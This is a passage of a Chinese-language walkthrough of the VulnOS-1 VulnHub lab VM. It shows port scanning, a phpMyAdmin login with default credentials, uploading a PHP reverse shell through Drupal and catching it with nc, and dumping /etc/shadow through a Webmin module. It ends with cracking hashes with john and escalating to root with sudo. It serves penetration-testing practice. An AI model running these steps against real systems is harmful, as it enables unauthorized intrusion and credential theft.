33370/tcp open  mountd      1-3 (RPC #100005)
56041/tcp open  status      1 (RPC #100024)
56144/tcp open  nlockmgr    1-4 (RPC #100021)
```

``` bash
root@kali:~# nmap -T4 -p 3632 -v 192.168.56.124
PORT     STATE SERVICE
3632/tcp open  distccd
```

在服务上花了足够的时间并尝试利用它们之后，成功利用了端口3632上托管的“distccd”服务。

搜索该服务的漏洞利用程序，发现了Meatsploit漏洞利用

``` bash
msf5 > search distccd

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution
```

设置RHOST IP地址并启动漏洞利用程序。

``` bash
msf5 exploit(unix/misc/distcc_exec) > exploit

[*] Started reverse TCP double handler on 192.168.56.102:3456 
[-] 192.168.56.124:3632 - Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer
[*] Exploit completed, but no session was created.
```

不知怎么回事，利用不了这个漏洞，可能是漏洞太古老，太久远了，只能尝试其他方法了。

非典型情况-许多端口是开放的。
更喜欢从快速验证（例如MySQL默认帐户，NFS等）开始，进行深度渗透测试。
试图使用默认凭据（例如root：root，root：toor，root：password，root：mysql）登录MySQL服务器。不幸的是没有成功。还检查了NFS，但没有好消息...

#### getshell

``` bash
root@kali:~# rpcinfo -p 192.168.56.124
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  60680  status
    100024    1   tcp  40626  status
    100021    1   udp  38218  nlockmgr
    100021    3   udp  38218  nlockmgr
    100021    4   udp  38218  nlockmgr
    100021    1   tcp  44108  nlockmgr
    100021    3   tcp  44108  nlockmgr
    100021    4   tcp  44108  nlockmgr
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100005    1   udp  55441  mountd
    100005    1   tcp  33014  mountd
    100005    2   udp  55441  mountd
    100005    2   tcp  33014  mountd
    100005    3   udp  55441  mountd
    100005    3   tcp  33014  mountd
root@kali:~# showmount -e 192.168.56.124
Export list for 192.168.56.124:
```

尝试使用OpenSSH。进行了大量研究，发现一些专门用于OpenSSH <= 5.3的漏洞利用，但是它不起作用。

 - ![](https://3.bp.blogspot.com/-Pe7E17cUN_Y/V2uK6vvqgnI/AAAAAAAABdY/DJf0tqzFYc0tCl48ZT2SADUWlF6vx5_KwCLcB/s1600/exp.png)

好的，现在轮到Web浏览。默认网页如下所示

- ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub258.jpg)

源代码也不包含任何有用的信息。单击被转发到的链接

- ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub259.jpg)

嗯，也没什么有用的东西。应该记住，端口80不仅是一个开放的http端口。运行dirbuster爆破目录试试

- ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub260.jpg)

该目标使用Apache 2.2.14，它存在公共漏洞利用程序（CVE-2010-0425）。Metasploit具有专用于此版本的辅助模块。但是，现在只想在没有其他方法的情况下使用metasploit。

Dirbuster发现该Web应用程序还具有phpmyadmin面板。因此，请尝试使用默认凭据登录，如root/toor。答对了！

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub261.jpg)

以root身份成功登录！很好。尝试从/etc/shadow加载数据，但与/etc/passwd相反（可能权限不足）没有成功。

 - ![](https://1.bp.blogspot.com/-RFOIgH37Zno/V2uVUZEaH6I/AAAAAAAABeY/f5ttDoTmHOUaAGrMkpVCkgHRhCVIr_73wCLcB/s1600/passwd.png)

有系统用户的完整列表。尝试使用outfile语句创建phpinfo文件，但未成功。

检查一下可以从数据库中检索到什么在Drupal6数据库中，可以找到

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub262.jpg)

好！但是必须破解这些hash。在mysql数据库中，可以找到以下凭证

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub263.jpg)

非常好，因为拥有与/etc/passwd文件中部分相同的用户名。破解了几个密码，例如drupal6密码drupal6。所以，现在专注于Drupal

浏览器访问下面的url并使用drupal6/drupal6登录

``` bash
http://192.168.56.124/drupal6/
```

现在，必须找到上传PHP后门的地方。在《Administer》中，添加允许扩展的php和phtml。创建了帖子并附加了PHP后门。成功上传phtml后门文件，然后点击它...

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub264.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub265.jpg)

访问shell

``` bash
http://192.168.56.124/drupal6/sites/default/files/phpreverseshell2.phtml
```

然后kali端使用nc监听

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.56.124: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.124] 56444
Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux
 05:30:10 up  1:05,  0 users,  load average: 0.03, 0.05, 0.34
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ pwd
/
```

优秀！获得了有限制的shell！检查了目标操作系统，并找到Ubuntu 10.04。不幸的是，每项攻击都行不通。花了很多时间寻找一些“秘密”文件，

``` bash
$ cat /etc/nagios3/htpasswd.users
nagiosadmin:8A86JOBWoCwnk
```

将/etc/passwd文件中的用户名作为字典列表，可能会有帮助。尝试使用john破解此密码

``` bash
root@kali:~/vulnhub/vulnos-1# john pass --wordlist=/root/vulnhub/vulnos-1/wordlist
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 44 candidates left, minimum 1024 needed for performance.
canuhack         (nagiosadmin)
1g 0:00:00:00 DONE (2020-04-17 03:25) 100.0g/s 4400p/s 4400c/s 4400C/s root..canuhack
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

很遗憾，没有nagiosadmin用户。/etc/passwd中的用户名为hackme，所以也许应该为canuhackme作为用户密码？

使用msf的auxiliary/admin/webmin/file_disclosure模块尝试读取/etc/shadow文件内容

然后将canuhackme添加到字典中

``` bash
msf5 auxiliary(admin/webmin/file_disclosure) > show options

Module options (auxiliary/admin/webmin/file_disclosure):

   Name     Current Setting   Required  Description
   ----     ---------------   --------  -----------
   DIR      /unauthenticated  yes       Webmin directory path
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.56.124    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH    /etc/shadow       yes       The file to download
   RPORT    10000             yes       The target port (TCP)
   SSL      false             no        Negotiate SSL/TLS for outgoing connections
   VHOST                      no        HTTP server virtual host


Auxiliary action:

   Name      Description
   ----      -----------
   Download  


msf5 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 192.168.56.124

[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:*:16137:0:99999:7:::
daemon:*:16137:0:99999:7:::
bin:*:16137:0:99999:7:::
sys:*:16137:0:99999:7:::
sync:*:16137:0:99999:7:::
games:*:16137:0:99999:7:::
man:*:16137:0:99999:7:::
lp:*:16137:0:99999:7:::
mail:*:16137:0:99999:7:::
news:*:16137:0:99999:7:::
uucp:*:16137:0:99999:7:::
proxy:*:16137:0:99999:7:::
www-data:*:16137:0:99999:7:::
backup:*:16137:0:99999:7:::
list:*:16137:0:99999:7:::
irc:*:16137:0:99999:7:::
gnats:*:16137:0:99999:7:::
nobody:*:16137:0:99999:7:::
libuuid:!:16137:0:99999:7:::
syslog:*:16137:0:99999:7:::
landscape:*:16137:0:99999:7:::
vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::
sysadmin:admin:16137:0:99999:7:::
webmin:webmin:16137:0:99999:7:::
hackme:hackme:16137:0:99999:7:::
sa:password1:16137:0:99999:7:::
stupiduser:stupiduser:16137:0:99999:7:::
messagebus:*:16137:0:99999:7:::
distccd:*:16137:0:99999:7:::
sshd:*:16138:0:99999:7:::
openldap:!:16138:0:99999:7:::
ftp:!:16138:0:99999:7:::
mysql:!:16138:0:99999:7:::
telnetd:*:16138:0:99999:7:::
bind:*:16138:0:99999:7:::
postgres:*:16138:0:99999:7:::
postfix:*:16138:0:99999:7:::
dovecot:*:16138:0:99999:7:::
tomcat6:*:16138:0:99999:7:::
statd:*:16138:0:99999:7:::
snmp:*:16138:0:99999:7:::
nagios:!:16140:0:99999:7:::
openerp:*:16140:0:99999:7:::
[*] Auxiliary module execution completed
```

再次使用john加载字典进行破解

``` bash
root@kali:~/vulnhub/vulnos-1# cat pass2
vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/root@kali:~/vulnhub/vulnos-1# john pass2 --wordlist=/root/vulnhub/vulnos-1/wordlist
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
canuhackme       (vulnosadmin)
1g 0:00:00:00 DONE (2020-04-17 03:52) 50.00g/s 2200p/s 2200c/s 2200C/s root..canuhackme
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

得到ssh登录用户名：vulnosadmin，密码：canuhackme

#### 登录并提权

``` bash
root@kali:~# ssh vulnosadmin@192.168.56.124
Enter passphrase for key '/root/.ssh/id_rsa': 
vulnosadmin@192.168.56.124's password: 
Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux
Ubuntu 10.04.4 LTS

Welcome to Ubuntu!
 * Documentation:  https://help.ubuntu.com/

  System information as of Fri Apr 17 09:55:15 CEST 2020

  System load:  0.0                Processes:           141
  Usage of /:   16.3% of 23.06GB   Users logged in:     0
  Memory usage: 38%                IP address for eth0: 192.168.56.124
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release 'precise' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Mar 19 17:31:44 2014 from 192.168.1.3
vulnosadmin@VulnOS:~$ id
uid=1000(vulnosadmin) gid=1000(vulnosadmin) groepen=4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin),1000(vulnosadmin)
vulnosadmin@VulnOS:~$ whoami
vulnosadmin
vulnosadmin@VulnOS:~$ sudo -l
[sudo] password for vulnosadmin: 
Matching Defaults entries for vulnosadmin on this host:
    env_reset

User vulnosadmin may run the following commands on this host:
    (ALL) ALL
vulnosadmin@VulnOS:~$ su
Wachtwoord: 
su: Authenticatie fout
vulnosadmin@VulnOS:~$ sudo su
root@VulnOS:/home/vulnosadmin# id
uid=0(root) gid=0(root) groepen=0(root)
root@VulnOS:/home/vulnosadmin# whoami
root
root@VulnOS:/home/vulnosadmin# cd /root
root@VulnOS:~# ls
hello.txt
root@VulnOS:~# cat hello.txt 
Hello,

So you got root... You still need to find the rest of the vulnerabilities inside the OS !

TRY HARDER !!!!!!!
```

成功登录，提权到root然后拿到了flag

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub266.jpg)

<font color="red">注意，此靶机的漏洞非常多，在此不一一尝试了，有兴趣自己去尝试，有新的方法可以联系我QQ:1185151867。</font>

#### 知识点总结

 - msf exploit/unix/misc/distcc_exec 模块利用distcc漏洞getshell
 - phpmyadmin弱口令
 - Drupal修改配置项上传phtml shell
 - john加载/etc/passwd用户名字典破解hash密码
 - msf auxiliary/admin/webmin/file_disclosure模块读取/etc/shadow文件内容
 - sudo su 然后输入密码提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>









<!-- kb:end vulnos-1 -->

</details>

